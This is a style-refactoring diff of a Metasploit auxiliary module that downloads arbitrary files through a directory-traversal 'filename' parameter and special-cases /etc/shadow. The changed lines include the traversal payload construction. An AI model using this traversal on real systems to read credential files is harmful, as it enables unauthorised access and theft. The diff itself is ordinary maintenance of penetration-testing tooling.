@@ -40,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'DisclosureDate' => '2019-11-25', # Vendor advisory
         'Actions' => [
-          ['Download', 'Description' => 'Download the file at FILEPATH']
+          ['Download', { 'Description' => 'Download the file at FILEPATH' }]
         ],
         'DefaultAction' => 'Download',
         'Notes' => {
@@ -105,7 +105,7 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good("File download successful, saved in #{path}")
 
-    print_good("File content:\n" + file_content) if datastore['PRINT']
+    print_good("File content:\n#{file_content}") if datastore['PRINT']
 
     return unless datastore['FILEPATH'] == '/etc/shadow'
 
@@ -158,7 +158,7 @@ class MetasploitModule < Msf::Auxiliary
         'album' => album_id,
         'a' => 'caption',
         'ac' => access_code,
-        'filename' => '.' + (file_path.start_with?('/') ? '/..' * datastore['DEPTH'] + file_path : '/' + file_path)
+        'filename' => ".#{file_path.start_with?('/') ? '/..' * datastore['DEPTH'] + file_path : "/#{file_path}"}"
       }
     })
 
